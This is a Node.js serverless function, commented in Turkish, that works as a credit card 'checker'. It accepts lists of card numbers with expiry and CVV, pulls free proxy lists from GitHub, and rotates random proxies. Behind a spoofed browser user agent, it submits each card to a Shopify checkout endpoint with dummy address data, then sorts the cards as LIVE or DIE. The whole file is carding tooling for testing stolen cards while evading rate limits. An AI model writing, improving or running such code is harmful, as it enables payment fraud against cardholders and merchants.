const axios = require('axios');
const { formidable } = require('formidable');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');

// --- SINIRSIZ PROXY ÇEKME (Test etmeden direkt kullanır) ---
async function getProxies() {
    try {
        const urls = [
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt'
        ];
        let allProxies = [];
        for (const url of urls) {
            try {
                const res = await axios.get(url, { timeout: 4000 });
                allProxies = allProxies.concat(res.data.split('\n').filter(p => p.trim() !== ''));
            } catch (e) {}
        }
        return [...new Set(allProxies)];
    } catch (e) { return []; }
}

// --- KART KONTROL (Shopify Auth Free) ---
async function checkCard(card, proxy) {
    try {
        const parts = card.trim().split('|');
        if (parts.length < 4) return { card, status: 'Invalid Format' };
        let [cc, mm, yy, cvv] = parts;

        if (yy.length === 4) yy = yy.substring(2); // 2028 -> 28

        // Proxy varsa kullan, yoksa direkt bağlan
        const agent = proxy ? new HttpsProxyAgent(`http://${proxy}`) : undefined;

        // Shopify test ödeme sayfası
        const shopifyUrl = 'https://checkout.shopify.com/store/checkout';
        
        const payload = new URLSearchParams({
            'checkout[email]': 'test@test.com',
            'checkout[shipping_address][first_name]': 'Test',
            'checkout[shipping_address][last_name]': 'Test',
            'checkout[shipping_address][address1]': 'Test',
            'checkout[shipping_address][city]': 'Test',
            'checkout[shipping_address][country]': 'US',
            'checkout[shipping_address][province]': 'CA',
            'checkout[shipping_address][zip]': '90001',
            'checkout[shipping_address][phone]': '1234567890',
            'checkout[payment_gateway]': 'shopify',
            'credit_card[number]': cc,
            'credit_card[month]': mm,
            'credit_card[year]': yy,
            'credit_card[verification_value]': cvv
        });

        const response = await axios.post(shopifyUrl, payload.toString(), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            },
            httpsAgent: agent,
            timeout: 10000,
            validateStatus: () => true
        });

        const text = response.data.toLowerCase();

        if (text.includes('card was declined') || text.includes('invalid') || text.includes('not processed') || text.includes('failed')) {
            return { card, status: 'DIE', msg: 'Declined' };
        } else if (text.includes('approved') || text.includes('success') || response.status === 302 || response.status === 200) {
            return { card, status: 'LIVE', msg: 'Approved' };
        }
        
        return { card, status: 'DIE', msg: 'Unknown' };

    } catch (e) {
        // Hata alırsa ERROR dön
        return { card, status: 'ERROR', msg: 'Proxy Hatasi' };
    }
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    if (req.method === 'OPTIONS') return res.status(200).end();

    let cardsToCheck = [];
    if (req.method === 'POST' && req.headers['content-type']?.includes('multipart/form-data')) {
        const form = formidable({ multiples: false });
        const [fields, files] = await form.parse(req);
        const uploadedFile = files.file ? (Array.isArray(files.file) ? files.file[0] : files.file) : null;
        if (uploadedFile) {
            const fileContent = fs.readFileSync(uploadedFile.filepath, 'utf8');
            cardsToCheck = fileContent.split('\n').map(l => l.trim()).filter(l => l.length > 0);
        } else if (fields.cards) {
            cardsToCheck = (Array.isArray(fields.cards) ? fields.cards[0] : fields.cards).split(',');
        }
    } else {
        const cardsParam = req.query.cards || (req.body && req.body.cards);
        if (cardsParam) cardsToCheck = cardsParam.split(',');
    }

    if (cardsToCheck.length === 0) return res.status(400).json({ hata: "Kart bulunamadi." });

    // Proxy havuzunu al (test etmiyoruz, direkt kullanıyoruz)
    const proxies = await getProxies();
    
    let results = [];
    // Kartları işle (Maksimum 10 kart)
    for (let i = 0; i < Math.min(cardsToCheck.length, 10); i++) {
        const card = cardsToCheck[i];
        // Rastgele bir proxy seç
        const currentProxy = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
        
        const result = await checkCard(card, currentProxy);
        results.push(result);
    }

    return res.status(200).json({
        success: true,
        live: results.filter(r => r.status === 'LIVE').length,
        die: results.filter(r => r.status === 'DIE').length,
        error: results.filter(r => r.status === 'ERROR').length,
        results: results
    });
};
